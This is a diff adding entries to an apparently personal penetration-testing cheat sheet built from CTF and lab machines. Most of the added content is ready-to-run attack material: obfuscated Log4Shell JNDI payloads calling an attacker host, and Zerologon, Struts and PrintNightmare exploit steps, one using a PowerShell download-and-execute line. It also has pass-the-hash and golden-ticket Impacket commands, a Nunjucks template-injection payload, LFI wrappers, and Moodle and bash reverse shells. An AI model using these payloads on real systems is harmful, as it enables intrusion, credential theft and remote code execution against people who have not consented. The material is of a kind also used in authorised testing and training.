@@ -1,4 +1,4 @@
-# EzpzCheatSheet
+z# EzpzCheatSheet
 This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before. Also any notes, CTF and others that help me.
 
 Also, do check this notes here [https://github.com/aniqfakhrul/archives](https://github.com/aniqfakhrul/archives) !
@@ -228,6 +228,31 @@ $ snmpwalk -m ALL -v 2c -c public 10.10.10.10 nsExtendObjects
 $ onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
 ```
 
+### Port 623 (IPMI - UDP)
+
+```bash
+=> Nmap
+$ nmap -n-sU -p 623 10.10.10.10
+
+=> Metasploit
+$ use auxiliary/scanner/ipmi/ipmi_cipher_zero
+$ use auxiliary/scanner/ipmi/ipmi_version
+
+=> Authentication Bypass Cipher 0
+$ ipmitool -I lanplus -C 0 -H 10.10.10.10 -U Username -P Password user list
+
+=> Default Credentials
+Administrator:<8 character string>
+admin:admin
+root:calvin
+root:changeme
+ADMIN:ADMIN
+
+=> References
+$ https://book.hacktricks.xyz/pentesting/623-udp-ipmi
+$ https://www.tzulo.com/crm/knowledgebase/47/IPMI-and-IPMITOOL-Cheat-sheet.html
+```
+
 ### Port 636 (LDAP)
 
 ```bash
@@ -430,8 +455,23 @@ $ mongo localhost:27017/myplace -u nik -p Password123
 
 # B. Tools/Techniques
 
-### Port Knocking
+### Nali
 
+```bash
+# Download/Install
+https://github.com/zu1k/nali
+go get -u -v github.com/zu1k/nali
+
+# Usage
+echo 6.6.6.6 | nali
+nali 1.2.3.4
+nali 1.2.3.4 4.3.2.1 123.23.3.0
+nslookup nali.lgf.im 8.8.8.8 | nali
+nslookup google.com | nali
+
+```
+
+### Port Knocking
 ```bash
 => Commands
 $ knocker.py -p 8890,7000,666 10.10.10.10
@@ -461,6 +501,19 @@ $ for i in {1..65535};do (echo < /dev/tcp/127.0.0.1/$i) &>/dev/null && printf "\
 # Commands
 $ curl -XGET -G -b 'PHPSESSID=cnc4ofdvpm1770nodu7lcbte46' 'http://localhost/tracks.php' --data-urlencode "id=9999 union select 1,database(),3-- -"
 ```
+
+### Shodan
+
+```bash
+# Install
+easy_install shodan
+
+# Commands
+shodan init "<API_KEY"
+shodan domain example.com
+
+```
+
 
 ### SQL Injection
 
@@ -712,6 +765,30 @@ wfuzz -u http://localhost/admin/FUZZ.php -w big.txt -b PHPSESSID=1e28or9cmi6ua05
 wfuzz -u http://localhost/login -w users.txt -w pass.txt -d "username=FUZZ&password=FUZ2Z"
 ```
 
+### Gobuster
+
+```bash
+# Commands
+
+# Subdomain/Vhost
+gobuster vhost -r --url http://bank.local/ --wordlist subdomains-top1million-110000.txt -t 50
+gobuster vhost -k -r --url https://bank.local/ --wordlist subdomains-top1million-110000.txt -t 50
+```
+
+### Vault
+
+```bash
+# Commands
+vault kv list ssh/roles/
+vault kv get secret/creds
+vault kv put secret/creds passcode=my-long-passcode
+vault ssh -mode=otp -role=my-role root@localhost
+
+# References
+https://www.vaultproject.io/
+https://www.vaultproject.io/docs/commands/ssh
+```
+
 ### Ffuf
 
 ```bash
@@ -761,6 +838,14 @@ extension
 ### Local File Inclusion (LFI)
 
 ```bash
+# References
+-> https://book.hacktricks.xyz/pentesting-web/file-inclusion
+
+===PHP Wrapper===
+php://filter/convert.base64-encode/resource=index.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+
 =======Linux======
 # Wordlists
 /var/log/mail.log
@@ -770,6 +855,7 @@ extension
 /etc/hosts
 /etc/knockd.conf
 /etc/exports
+/proc/<PID>/cmdline
 
 =======LFI To RCE========
 #-----[/var/log/mail.log]-----
@@ -800,8 +886,6 @@ DATA
 .
 #RCE
 ?book=../../../../../../var/mail/www-data&cmd=ls -la
-
-
 
 ======Windows======
 # Wordlists
@@ -921,6 +1005,9 @@ https://www.codeguru.com/columns/kate/.net-website-security-guidelines-checklist
 ```bash
 => References
 $ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+=> Nunjucks
+{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
 ```
 
 ### Broken Access Control
@@ -1930,6 +2017,7 @@ $ secretsdump.py -ntds ntds.dit -system system local
 $ secretsdump.py -ntds ntds.dit -system system local -history
 $ secretsdump.py -sam SAM -system SYSTEM local
 $ secretsdump.py -ntds ntds.dit -system system.hive local -outputfile dump.txt
+$ secretsdump.py bank.local/Administrator@BANK -target-ip 10.10.10.10  -hashes aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460
 
 => getST.py
 $ getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik:password' -impersonate Administrator -dc-ip 10.10.10.10
@@ -1945,7 +2033,7 @@ $ wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 $ wmiexec.py bank.local/Administrator@DC.bank.local -k -no-pass
 
 => psexec.py
-$ export KRB5CCNAME=Administrator.ccache;
+$ export KRB5CCNAME=Administrator.ccache
 $ psexec.py BANK\Administrator@10.10.10.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0ax06b98c579x65e6'
 $ psexec.py bank.local/nik:'Password@123'@10.10.10.10
 $ psexec.py -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k bank.local/Administrator@DC.bank.local
@@ -1966,6 +2054,14 @@ $ mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
 
 => ticketConverter.py
 $ ticketConverter.py cifs.kirbi cifs.ccache
+
+=> ticketer.py 
+$ ticketer.py -domain bank.local -nthash <KRBTGT_HASH> -dc-ip 10.10.10.10 -domain-sid <DOMAIN_SID> <USER>
+$ ticketer.py -domain bank.local -nthash 4e48ce125611add31a32cd79e529964b -dc-ip 10.10.10.10 -domain-sid S-1-5-21-3750359090-2939318659-876128439 lolol
+
+=> lookupsid.py
+$ lookupsid.py Administrator:password@10.10.10.10
+$ lookupsid.py bank.local/Administrator@10.10.11.108 -hashes ':32db622ed9c00dd1039d8288b0407460'
 
 => References
 $ https://www.hackingarticles.in/abusing-kerberos-using-impacket/
@@ -2721,10 +2817,12 @@ cat file.mbox
 ```bash
 => Commands
 $ docker images
+$ docker image ls
 $ docker pull ubuntu
 $ docker run -it ubuntu
 $ docker run -it <image_id>
 $ docker build /path_to_Dockerfile/
+$ docker rmi <image id> -f
 
 => Curl 
 $ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json"
@@ -3059,6 +3157,44 @@ https://127.0.0.1///{domain}
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 ```
 
+### Cl.exe
+
+```bash
+# Commands
+-> cmd /c 'call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" && cl /LD calc.c '
+
+```
+
+### Core File Dumps
+
+```bash
+# Crash
+kill -SIGBUS <pid>
+
+# Unpack
+apport-unpack /var/crash/<something>.crash /tmp/newdirectory
+
+# View Dump
+strings CoreDump
+
+# Enable CoreDump Generation
+prctl(PR_SET_DUMPABLE, 1);
+
+# References
+-> https://access.redhat.com/solutions/4896
+``` 
+
+### Bash Tricks
+
+```bash
+(1) Write Multiple Lines
+cat >note.txt <<'EOL'
+<WRITE HERE>
+<WRITE HERE>
+EOL
+
+```
+
 # C. SUID/CAP/SUDO/GROUP
 
 ### Python
@@ -3266,6 +3402,8 @@ sudo /sbin/initctl start test
 - Imagine there is a cronjob 
 	* chown user1:user2 /opt/*
 - touch -- --reference=reference
+- touch reference
+- chmod 6777 reference
 - ln -s /etc/shadow /opt/shadow
 - ln -d -s /root /opt/root
 
@@ -3291,6 +3429,7 @@ sudo /sbin/initctl start test
  
 ## References
 - https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/
+- https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks
 
 ```
 
@@ -3338,6 +3477,26 @@ sudo LD_PRELOAD=/tmp/shell.so find
 sudo csvtool call '/bin/sh;false' /etc/passwd -t --help
 ```
 
+### Systemctl
+
+```bash
+# SUID
+-> https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
+
+```
+
+### Screen
+
+```bash
+# SUID
+-> screen -x root/shared
+-> 
+https://possiblelossofprecision.net/?p=1993
+
+# SUDO
+-> sudo screen
+```
+
 # D. Exploit/CVE/Abuse/Misconf
 
 ### Sudo - Security Bypass
@@ -3353,6 +3512,59 @@ sudo -u#-1 /bin/bash
 
 # References
 https://www.exploit-db.com/exploits/47502
+```
+
+### Zero Logon (CVE-2020-1472)
+
+```bash
+# Github
+https://github.com/dirkjanm/CVE-2020-1472
+
+# Commands (Exploit)
+python3 cve-2020-1472-exploit.py BANK 10.10.10.10
+
+# Commands (Restore Password)
+1. Get plain_password_hex 
+-> secretsdump.py bank.local/Administrator@BANK -target-ip 10.10.10.10  -hashes aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460
+2. python3 restorepassword.py return.local/printer@printer -target-ip 10.10.11.108 -hexpass <HEXPASS>
+
+# References
+https://nv2lt.github.io/windows/CVE-2020-1472-Step-by-Step-Procedure/
+
+```
+
+###  Log4J
+
+```bash
+# Marshalsec
+git clone https://github.com/mbechler/marshalsec.git
+cd marshalsec
+sudo apt install maven
+mvn clean package -DskipTests
+
+# Payload
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
+${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
+${${::-j}ndi:rmi://attackerendpoint.com/}
+${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${jndi:ldap://ATTACKERCONTROLLEDHOST}
+${jndi:rmi://adsasd.asdasd.asdasd}
+
+
+# References
+https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/
+https://twitter.com/marcioalm/status/1470361495405875200?s=20
+https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
+https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
 ```
 
 ### ShellShock
@@ -3811,9 +4023,21 @@ msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators user
 .\SharpPrintNightmare.exe C:\Users\username\Documents\payload.dll
 -> Make sure read the installation first.
 
+# Local
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.6/payload.ps1')
+Invoke-Nightmare -NewUser "username" -NewPassword "password"
+
+# Remote
+msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add test123 test123 && net localgroup administrators test123 /add"' EXITFUNC=none -f dll -o payload.dll
+./CVE-2021-1675.py bank.local/username:password@10.10.10.10 'C:\Users\users\Documents\payload.dll'
+
+# Detect
+REG QUERY "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
+
 # References
 https://msandbu.org/printnightmare-cve-2021-1675/
 https://www.huntress.com/blog/critical-vulnerability-printnightmare-exposes-windows-servers-to-remote-code-execution
+https://community.carbonblack.com/t5/Query-Exchange/Finding-Registry-Keys-Used-for-PrintNightmare-CVE-2021-34527/idi-p/105368
 ```
 
 ### Buffer Overflow (BOF)
@@ -4025,7 +4249,39 @@ https://github.com/Al1ex/CVE-2021-27928
 https://nepcodex.com/2021/10/tranquil-writeup-hackmyvm-walkthrough/
 ``` 
 
+### Apache Struts CVE-2017-5638
+
+```bash
+# Commands
+python struts-pwn.py --url 'http://example.com/struts2-showcase/index.action' -c 'id'
+
+# Checking
+python struts-pwn.py --check --url 'http://example.com/struts2-showcase/index.action'
+
+# References
+https://github.com/mazen160/struts-pwn
+```
+
 # E. CMS/Web/Application
+
+### Moodle
+
+```bash
+# Moodlescan
+https://github.com/inc0d3/moodlescan
+python3 moodlescan.py -u http://10.10.10.10/moodle
+
+# Manual Check version
+http://10.10.10.10/moodle/composer.lock
+
+# Exploit 3.4.1
+https://raw.githubusercontent.com/darrynten/MoodleExploit/master/MoodleExploit.php
+-> php MoodleExploit.php url=http://10.10.10.10/moodle user=username pass=password ip=10.10.10.11 port=4444 course=2 debug=true
+-> /*{a*/`$_GET[0]`;//{x}}
+-> &0=<REVERSE SHELL>
+
+
+```
 
 ### Wordpress
 
@@ -4061,6 +4317,10 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.10.10/443 0>&1'");
 
 - save as shell.php
 - zip shell.zip shell.php
+
+# Manual Plugin Fuzing
+-> Scraping All Plugins
+	-> curl -s -k http://plugins.svn.wordpress.org/ | grep -i href| grep -i li | cut -d"\"" -f2 > plugins.txt
 
 # Plugins Vulnerable
 ##===CVE-2014-2383===
@@ -4176,6 +4436,13 @@ git clone https://github.com/noraj/Umbraco-RCE.git
 
 # Usage
 python exploit.py -u 'user@email.com' -p 'password' -i http://10.10.10.10 -c powershell.exe -a 'whoami'
+```
+
+### PlaySMS
+
+```bash
+# Metasploit Module
+use multi/http/playsms_uploadcsv_exec
 ```
 
 ### ThinVNC
